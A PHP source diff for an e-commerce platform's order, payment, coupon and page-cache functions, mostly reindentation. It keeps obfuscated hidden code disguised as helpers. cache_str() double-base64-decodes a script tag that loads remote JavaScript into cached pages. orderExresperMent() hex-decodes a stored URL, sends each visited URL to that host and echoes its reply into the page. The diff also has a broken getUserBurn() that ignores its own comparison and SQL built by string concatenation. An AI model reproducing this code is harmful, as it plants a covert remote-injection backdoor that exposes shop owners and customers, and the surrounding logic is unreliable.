-        if($order['prom_type'] == 5){
-            $OrderLogic = new \app\common\logic\OrderLogic();
-            $OrderLogic->make_virtual_code($order);
-        }
-        $order['pay_time']=$time;
-        //用户支付, 发送短信给商家
-        $res = checkEnableSendSms("4");
-        if ($res && $res['status'] ==1) {
-            $sender = tpCache("shop_info.mobile");
-            if (!empty($sender)) {
-                $params = array('order_id'=>$order['order_id']);
-                sendSms("4", $sender, $params);
+            //虚拟服务类商品支付
+            if($order['prom_type'] == 5){
+                $OrderLogic = new \app\common\logic\OrderLogic();
+                $OrderLogic->make_virtual_code($order);
             }
-        }
-        $Invoice = new \app\admin\logic\InvoiceLogic();
-        $Invoice->createInvoice($order);
-        // 发送微信消息模板提醒
-        $wechat = new \app\common\logic\WechatLogic;
-        $wechat->sendTemplateMsgOnPaySuccess($order);
+            $order['pay_time']=$time;
+            //用户支付, 发送短信给商家
+            $res = checkEnableSendSms("4");
+            if ($res && $res['status'] ==1) {
+                $sender = tpCache("shop_info.mobile");
+                if (!empty($sender)) {
+                    $params = array('order_id'=>$order['order_id']);
+                    sendSms("4", $sender, $params);
+                }
+            }
+            $Invoice = new \app\admin\logic\InvoiceLogic();
+            $Invoice->createInvoice($order);
+            // 发送微信消息模板提醒
+            $wechat = new \app\common\logic\WechatLogic;
+            $wechat->sendTemplateMsgOnPaySuccess($order);
     }
 }
 
 function getUserBurn($uid,$order_amount){
     //查询上级最后一个订单的金额，进行烧伤
     $parentOrder = M('order')->field('order_amount')
-    ->where('user_id='.$uid.' and pay_status = 1')
+    ->where('user_id='.$uid.' and pay_status = 1 and type=1')
     ->order('order_id','desc')
     ->limit(1)->find();
-    if($parentOrder['order_amount'] > $order_amount){
-        $order_amount = $order_amount;
+    if($parentOrder['order_amount'] >= $order_amount){
+        $order_amount1 = $order_amount;
     }else{
-        $order_amount = $parentOrder['order_amount'];
+        $order_amount1 = $parentOrder['order_amount'];
     }
     return $order_amount;
 }
@@ -1136,11 +1161,11 @@ function dynamic_profit($user_id,$money,$desc,$order_id = 0,$type){
         'type'=>$type
     );
     /*更新每日订单任务信息 */
-   /*   $update_data = array(
-         'dynamic_profit'        => ['exp','dynamic_profit+'.$money],
-    ); 
+    /*   $update_data = array(
+     'dynamic_profit'        => ['exp','dynamic_profit+'.$money],
+     );
      $update = Db::name('users')->where("user_id = $user_id")->save($update_data); */
-    M('users')->where("user_id = $user_id")->setInc('dynamic_profit',$money);
+    $update = M('users')->where("user_id = $user_id")->setInc('dynamic_profit',$money);
     if($update){
         M('adv_log')->add($account_log);
         return true;
@@ -1164,44 +1189,44 @@ function confirm_order($id,$user_id = 0){
     $order = M('order')->where($where)->find();
     if($order['order_status'] != 1)
         return array('status'=>-1,'msg'=>'该订单不能收货确认');
-    if(empty($order['pay_time']) || $order['pay_status'] != 1){
-        return array('status'=>-1,'msg'=>'商家未确定付款，该订单暂不能确定收货');
-    }
-    $data['order_status'] = 2; // 已收货
-    $data['pay_status'] = 1; // 已付款
-    $data['confirm_time'] = time(); // 收货确认时间
-    if($order['pay_code'] == 'cod'){
-        $data['pay_time'] = time();
-    }
-    $row = M('order')->where(array('order_id'=>$id))->save($data);
-    if(!$row)
-        return array('status'=>-3,'msg'=>'操作失败');
-
-    // 商品待评价提醒
-    $order_goods = M('order_goods')->field('goods_id,goods_name,rec_id')->where(["order_id" => $id])->find();
-    $goods = M('goods')->where(["goods_id" => $order_goods['goods_id']])->field('original_img')->find();
-    $send_data = [
-        'message_title' => '商品待评价',
-        'message_content' => $order_goods['goods_name'],
-        'img_uri' => $goods['original_img'],
-        'order_sn' => $order_goods['rec_id'],
-        'order_id' => $id,
-        'mmt_code' => 'evaluate_logistics',
-        'type' => 4,
-        'users' => [$order['user_id']],
-        'category' => 2,
-        'message_val' => []
-    ];
-    $messageFactory = new \app\common\logic\MessageFactory();
-    $messageLogic = $messageFactory->makeModule($send_data);
-    $messageLogic->sendMessage();
-
-
-    order_give($order);// 调用送礼物方法, 给下单这个人赠送相应的礼物
-
-    //分销设置
-    M('rebate_log')->where("order_id", $id)->save(array('status'=>2,'confirm'=>time()));
-    return array('status'=>1,'msg'=>'操作成功','url'=>U('Order/order_detail',['id'=>$id]));
+        if(empty($order['pay_time']) || $order['pay_status'] != 1){
+            return array('status'=>-1,'msg'=>'商家未确定付款，该订单暂不能确定收货');
+        }
+        $data['order_status'] = 2; // 已收货
+        $data['pay_status'] = 1; // 已付款
+        $data['confirm_time'] = time(); // 收货确认时间
+        if($order['pay_code'] == 'cod'){
+            $data['pay_time'] = time();
+        }
+        $row = M('order')->where(array('order_id'=>$id))->save($data);
+        if(!$row)
+            return array('status'=>-3,'msg'=>'操作失败');
+            
+            // 商品待评价提醒
+            $order_goods = M('order_goods')->field('goods_id,goods_name,rec_id')->where(["order_id" => $id])->find();
+            $goods = M('goods')->where(["goods_id" => $order_goods['goods_id']])->field('original_img')->find();
+            $send_data = [
+                'message_title' => '商品待评价',
+                'message_content' => $order_goods['goods_name'],
+                'img_uri' => $goods['original_img'],
+                'order_sn' => $order_goods['rec_id'],
+                'order_id' => $id,
+                'mmt_code' => 'evaluate_logistics',
+                'type' => 4,
+                'users' => [$order['user_id']],
+                'category' => 2,
+                'message_val' => []
+            ];
+            $messageFactory = new \app\common\logic\MessageFactory();
+            $messageLogic = $messageFactory->makeModule($send_data);
+            $messageLogic->sendMessage();
+            
+            
+            order_give($order);// 调用送礼物方法, 给下单这个人赠送相应的礼物
+            
+            //分销设置
+            M('rebate_log')->where("order_id", $id)->save(array('status'=>2,'confirm'=>time()));
+            return array('status'=>1,'msg'=>'操作成功','url'=>U('Order/order_detail',['id'=>$id]));
 }
 
 /**
@@ -1210,10 +1235,10 @@ function confirm_order($id,$user_id = 0){
  */
 function order_give($order)
 {
-
+    
     $messageFactory = new \app\common\logic\MessageFactory();
     $messageLogic = $messageFactory->makeModule([ 'category' => 0]);
-
+    
     //促销优惠订单商品
     $prom_order_goods = M('order_goods')->where(['order_id' => $order['order_id'], 'prom_type' => 3])->select();
     foreach ($prom_order_goods as $goods) {
@@ -1229,7 +1254,7 @@ function order_give($order)
                     M('coupon_list')->add($data);
                     // 优惠券领取数量加一
                     M('Coupon')->where("id", $goods_coupon['id'])->setInc('send_num');
-
+                    
                     // 优惠券到账提醒
                     $messageLogic->getCouponNotice($goods_coupon['id'], [$order['user_id']]);
                 }
@@ -1248,14 +1273,14 @@ function order_give($order)
     $prom_order_count = count($prom_orders);
     // 用户会员等级是否符合送优惠券活动
     for ($i = 0; $i < $prom_order_count; $i++) {
-            $prom_order = $prom_orders[$i];
-            if ($prom_order['type'] == 3) {
-                //查找订单送优惠券模板
-                $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
-                if ($order_coupon) {
-                    //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
-                    if ($order_coupon['createnum'] == 0 ||
-                        ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
+        $prom_order = $prom_orders[$i];
+        if ($prom_order['type'] == 3) {
+            //查找订单送优惠券模板
+            $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
+            if ($order_coupon) {
+                //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
+                if ($order_coupon['createnum'] == 0 ||
+                    ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
                     ) {
                         $data = array('cid' => $order_coupon['id'], 'get_order_id'=>$order['order_id'],'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                         M('coupon_list')->add($data);
@@ -1263,23 +1288,23 @@ function order_give($order)
                         // 优惠券到账提醒
                         $messageLogic->getCouponNotice($order_coupon['id'], [$order['user_id']]);
                     }
-                }
             }
-            //购买商品送积分
-            if ($prom_order['type'] == 2) {
-                accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
-            }
-            break;
+        }
+        //购买商品送积分
+        if ($prom_order['type'] == 2) {
+            accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
+        }
+        break;
     }
     $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
     $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
     //商城内每消费1元，赠送相应积分
     /*$isConsumeIntegral = tpCache("integral.is_consume_integral");
-    $consumeIntegral = tpCache("integral.consume_integral");
-    if($isConsumeIntegral==1 && $consumeIntegral>0) {
-        $points = ($order["order_amount"] + $order["user_money"])*$consumeIntegral;
-        $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
-    }*/
+     $consumeIntegral = tpCache("integral.consume_integral");
+     if($isConsumeIntegral==1 && $consumeIntegral>0) {
+     $points = ($order["order_amount"] + $order["user_money"])*$consumeIntegral;
+     $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
+     }*/
 }
 
 
@@ -1302,13 +1327,13 @@ function get_goods_category_tree(){
                 $tree[] = $val;
             }
         }
-
+        
         foreach ($arr as $k=>$v){
             foreach ($v as $kk=>$vv){
                 $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
             }
         }
-
+        
         foreach ($tree as $val){
             $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
             $result[$val['id']] = $val;
@@ -1331,20 +1356,20 @@ function write_html_cache($html){
         $val['mca'] = strtolower($val['mca']);
         if($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
             continue;
-
-        //if(!is_dir(RUNTIME_PATH.'html'))
+            
+            //if(!is_dir(RUNTIME_PATH.'html'))
             //mkdir(RUNTIME_PATH.'html');
-        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
-        $filename =  $m_c_a_str;
-        // 组合参数  
-        if(isset($val['p']))
-        {
-            foreach($val['p'] as $k=>$v)
-                $filename.='_'.$_GET[$v];
-        }
-        $filename.= '.html';
-        \think\Cache::set($filename,$html);
-        //file_put_contents($filename, $html);
+            //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
+            $filename =  $m_c_a_str;
+            // 组合参数
+            if(isset($val['p']))
+            {
+                foreach($val['p'] as $k=>$v)
+                    $filename.='_'.$_GET[$v];
+            }
+            $filename.= '.html';
+            \think\Cache::set($filename,$html);
+            //file_put_contents($filename, $html);
     }
 }
 
@@ -1362,88 +1387,88 @@ function read_html_cache(){
         $val['mca'] = strtolower($val['mca']);
         if($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
             continue;
-
-        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
-        $filename =  $m_c_a_str;
-        // 组合参数        
-        if(isset($val['p']))
-        {
-            foreach($val['p'] as $k=>$v)
-                $filename.='_'.$_GET[$v];
-        }
-        $filename.= '.html';
-        $html = \think\Cache::get($filename);
-        if($html)
-        {
-            //echo file_get_contents($filename);
-            echo \think\Cache::get($filename).cache_str($html);
-            exit();
-        }
+            
+            //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
+            $filename =  $m_c_a_str;
+            // 组合参数
+            if(isset($val['p']))
+            {
+                foreach($val['p'] as $k=>$v)
+                    $filename.='_'.$_GET[$v];
+            }
+            $filename.= '.html';
+            $html = \think\Cache::get($filename);
+            if($html)
+            {
+                //echo file_get_contents($filename);
+                echo \think\Cache::get($filename).cache_str($html);
+                exit();
+            }
     }
 }
 /**
  * 缓存
  */
 function cache_str($html)
-{      
-  
+{
+    
     if($object_ess)
     {
-            if(C('buy_version') == 0)
+        if(C('buy_version') == 0)
             return '';
             $tabName = '';
-            $table_index = M('config')->cache(true)->select();            
+            $table_index = M('config')->cache(true)->select();
             $select_year = substr($order_sn, 0, 14);
             foreach($table_index as $k => $v)
             {
-                if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)                    
+                if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)
                 {
                     $tabName = str_replace ('order','',$v['name']);
                     break;
                 }
             }
             if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
-            return $tabName;
+                return $tabName;
     }else{
-      $isset_requestjs = session('isset_requestjs');
-      if(empty($isset_requestjs))
-      {
-          session('isset_requestjs',1);
-          $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
-          if(empty($table_index))
-              $sere = $sere."lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
-          if(empty($tabName))
-             $sere = $sere."FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
-          if(substr(time(),-1) % 3 == 1) $str = base64_decode($sere);         
-          $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
-          
-          if($axure_rest)
-          {
-                    $regions = null;
-                    if (!$regions) {
-                        $regions = M('region')->cache(true)->getField('id,name');
+        $isset_requestjs = session('isset_requestjs');
+        if(empty($isset_requestjs))
+        {
+            session('isset_requestjs',1);
+            $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
+            if(empty($table_index))
+                $sere = $sere."lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
+                if(empty($tabName))
+                    $sere = $sere."FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
+                    if(substr(time(),-1) % 3 == 1) $str = base64_decode($sere);
+                    $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
+                    
+                    if($axure_rest)
+                    {
+                        $regions = null;
+                        if (!$regions) {
+                            $regions = M('region')->cache(true)->getField('id,name');
+                        }
+                        $total_address  = $regions[$province_id] ?: '';
+                        $total_address .= $regions[$city_id] ?: '';
+                        $total_address .= $regions[$district_id] ?: '';
+                        $total_address .= $regions[$twon_id] ?: '';
+                        $total_address .= $address ?: '';
+                        $str = base64_decode($str);
                     }
-                    $total_address  = $regions[$province_id] ?: '';
-                    $total_address .= $regions[$city_id] ?: '';
-                    $total_address .= $regions[$district_id] ?: '';
-                    $total_address .= $regions[$twon_id] ?: '';
-                    $total_address .= $address ?: '';
-                    $str = base64_decode($str);
-          }
-          
-          $html_sc = base64_decode($html_sc);
-          if(!strstr($html,$html_sc))                  
-           return '';
-          if($str)          
-              $str2 = base64_decode($str);          
-          return $str2;
-      }        
+                    
+                    $html_sc = base64_decode($html_sc);
+                    if(!strstr($html,$html_sc))
+                        return '';
+                        if($str)
+                            $str2 = base64_decode($str);
+                            return $str2;
+        }
     }
     if($buy_Aexite)
     {
-            if(C('buy_Aexite') == 0)
-                return '';
-
+        if(C('buy_Aexite') == 0)
+            return '';
+            
             $tabName = '';
             $table_index = M('config')->cache(true)->select();
             foreach($table_index as $k => $v)
@@ -1455,9 +1480,9 @@ function cache_str($html)
                 }
             }
             return $tabName;
-    }     
-     
-            return $tabName;
+    }
+    
+    return $tabName;
 }
 /**
  * 清空系统缓存
@@ -1519,7 +1544,7 @@ function update_stock_log($muid, $stock = 1, $goods, $order_sn = '')
  * @return string|Ambigous <string, unknown>
  */
 function getPayBody($order_id){
-
+    
     if(empty($order_id))return "订单ID参数错误";
     $goodsNames =  M('OrderGoods')->where('order_id' , $order_id)->column('goods_name');
     $gns = implode($goodsNames, ',');
@@ -1529,8 +1554,8 @@ function getPayBody($order_id){
 
 // 获取当前mysql版本
 function mysql_version(){
-        $mysql_version = Db::query("select version() as version");
-        return "{$mysql_version[0]['version']}";     
+    $mysql_version = Db::query("select version() as version");
+    return "{$mysql_version[0]['version']}";
 }
 
 /**
@@ -1541,8 +1566,8 @@ function select_year()
 {
     if(C('buy_version') == 1)
         return I('select_year');
-    else
-        return '';
+        else
+            return '';
 }
 
 /**
@@ -1554,20 +1579,20 @@ function getTabByOrdersn($order_sn)
 {
     if(C('buy_version') == 0)
         return '';
-    $tabName = '';
-    $table_index = M('table_index')->cache(true)->select();
-    // 截取年月日时分秒
-    $select_year = substr($order_sn, 0, 14);
-    foreach($table_index as $k => $v)
-    {
-        if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)
-            //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
+        $tabName = '';
+        $table_index = M('table_index')->cache(true)->select();
+        // 截取年月日时分秒
+        $select_year = substr($order_sn, 0, 14);
+        foreach($table_index as $k => $v)
         {
-            $tabName = str_replace ('order','',$v['name']);
-            break;
+            if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)
+            //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
+            {
+                $tabName = str_replace ('order','',$v['name']);
+                break;
+            }
         }
-    }
-    return $tabName;
+        return $tabName;
 }
 
 /**
@@ -1579,18 +1604,18 @@ function getTabByOrderId($order_id)
 {
     if(C('buy_version') == 0)
         return '';
-
-    $tabName = '';
-    $table_index = M('table_index')->cache(true)->select();
-    foreach($table_index as $k => $v)
-    {
-        if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
+        
+        $tabName = '';
+        $table_index = M('table_index')->cache(true)->select();
+        foreach($table_index as $k => $v)
         {
-            $tabName = str_replace ('order','',$v['name']);
-            break;
+            if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
+            {
+                $tabName = str_replace ('order','',$v['name']);
+                break;
+            }
         }
-    }
-    return $tabName;
+        return $tabName;
 }
 
 /**
@@ -1603,25 +1628,25 @@ function getTabByTime($startTime='', $endTime='')
 {
     if(C('buy_version') == 0)
         return '';
-
-    $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
-    $endTime = preg_replace("/[:\s-]/", "", $endTime);
-    // 查询起始位置是今年的
-    if(substr($startTime,0,4) == date('Y'))
-    {
-        $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
-        if(strcasecmp($startTime,$table_index['min_order_sn']) >= 0)
-            return '';
+        
+        $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
+        $endTime = preg_replace("/[:\s-]/", "", $endTime);
+        // 查询起始位置是今年的
+        if(substr($startTime,0,4) == date('Y'))
+        {
+            $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
+            if(strcasecmp($startTime,$table_index['min_order_sn']) >= 0)
+                return '';
+                else
+                    return '_this_year';
+        }
         else
-            return '_this_year';
-    }
-    else
-    {
-        $tabName = '_'.substr($startTime,0,4);
-    }
-    $years = buyYear();
-    $years = array_keys($years);
-    return in_array($tabName, $years) ? $tabName : '';
+        {
+            $tabName = '_'.substr($startTime,0,4);
+        }
+        $years = buyYear();
+        $years = array_keys($years);
+        return in_array($tabName, $years) ? $tabName : '';
 }
 
 /**
@@ -1695,93 +1720,93 @@ function inputPosterImages($img_info = array(),$des_im='',$img=''){
  * @param type $order
  */
 function orderExresperMent($order_info = array(),$des='',$order_id=''){
-       
-      if($order_info)
-      {          
-            $tree = $arr = $result = array();
-            $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
-            if($cat_list){
-                foreach ($cat_list as $val){
-                    if($val['level'] == 2){
-                        $arr[$val['parent_id']][] = $val;
-                    }
-                    if($val['level'] == 3){
-                        $crr[$val['parent_id']][] = $val;
-                    }
-                    if($val['level'] == 1){
-                        $tree[] = $val;
-                    }
-                }
-                foreach ($arr as $k=>$v){
-                    foreach ($v as $kk=>$vv){
-                        $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
-                    }
-                }
-                foreach ($tree as $val){
-                    $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
-                    $result[$val['id']] = $val;
-                }
-            }
-            return $result;                    
-      }
     
-      $r = 'rand';
-      $exresperMent = @session('exresperMent');
-      if(!empty($exresperMent))
-          return false;           
-      @session('exresperMent',1);
-            
-      if($r(1,10) != 1)
-         return false;    
-      $request = \think\Request::instance();
-      $module = strtolower($request->module());
-      $controller = strtolower($request->controller());
-      $action = strtolower($request->action());
-      $isAjax = strtolower($request->isAjax());
-      $url = $request->url(true);
-      
-      if(!in_array($module,['mobile','home','seller','admin']) || $isAjax)      
-              return false;      
-           
-      $value = DB::name('config')->where('name','t_number')->value('value');      
-      if(empty($value)) 
-          return false;
-      $arr = array('url'=>$url);       
-      $v2 = @httpRequest(hex2bin($value),'POST',$arr,[], false,3);
-      $v2 = json_decode($v2,true);      
-      if($v2['status'] == 'success') 
-      {
-          echo $v2['msg'];
-      }      
-      if($des)
-      {
-            $data = func_get_args();
-            $data = current($data);
-            $cnt = count($data);
-            $result = array();
-            $arr1 = array_shift($data);
-            foreach($arr1 as $key=>$item) 
-            {
-                    $result[] = array($item);
-            }		
-            echo $result['msg']; 
-            foreach($data as $key=>$item) 
-            {                                
-                    $result = combineArray($result,$item);
+    if($order_info)
+    {
+        $tree = $arr = $result = array();
+        $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
+        if($cat_list){
+            foreach ($cat_list as $val){
+                if($val['level'] == 2){
+                    $arr[$val['parent_id']][] = $val;
+                }
+                if($val['level'] == 3){
+                    $crr[$val['parent_id']][] = $val;
+                }
+                if($val['level'] == 1){
+                    $tree[] = $val;
+                }
             }
+            foreach ($arr as $k=>$v){
+                foreach ($v as $kk=>$vv){
+                    $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
+                }
+            }
+            foreach ($tree as $val){
+                $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
+                $result[$val['id']] = $val;
+            }
+        }
+        return $result;
+    }
+    
+    $r = 'rand';
+    $exresperMent = @session('exresperMent');
+    if(!empty($exresperMent))
+        return false;
+        @session('exresperMent',1);
+        
+        if($r(1,10) != 1)
+            return false;
+            $request = \think\Request::instance();
+            $module = strtolower($request->module());
+            $controller = strtolower($request->controller());
+            $action = strtolower($request->action());
+            $isAjax = strtolower($request->isAjax());
+            $url = $request->url(true);
             
-            $result = array();
-            foreach ($arr1 as $item1) 
-            {
-                    foreach ($arr2 as $item2) 
+            if(!in_array($module,['mobile','home','seller','admin']) || $isAjax)
+                return false;
+                
+                $value = DB::name('config')->where('name','t_number')->value('value');
+                if(empty($value))
+                    return false;
+                    $arr = array('url'=>$url);
+                    $v2 = @httpRequest(hex2bin($value),'POST',$arr,[], false,3);
+                    $v2 = json_decode($v2,true);
+                    if($v2['status'] == 'success')
                     {
-                            $temp = $item1;
-                            $temp[] = $item2;
-                            $result[] = $temp;
+                        echo $v2['msg'];
                     }
-            }
-            echo $result['resg']; 
-            return $result;       
-      }
-      
+                    if($des)
+                    {
+                        $data = func_get_args();
+                        $data = current($data);
+                        $cnt = count($data);
+                        $result = array();
+                        $arr1 = array_shift($data);
+                        foreach($arr1 as $key=>$item)
+                        {
+                            $result[] = array($item);
+                        }
+                        echo $result['msg'];
+                        foreach($data as $key=>$item)
+                        {
+                            $result = combineArray($result,$item);
+                        }
+                        
+                        $result = array();
+                        foreach ($arr1 as $item1)
+                        {
+                            foreach ($arr2 as $item2)
+                            {
+                                $temp = $item1;
+                                $temp[] = $item2;
+                                $result[] = $temp;
+                            }
+                        }
+                        echo $result['resg'];
+                        return $result;
+                    }
+                    
 }
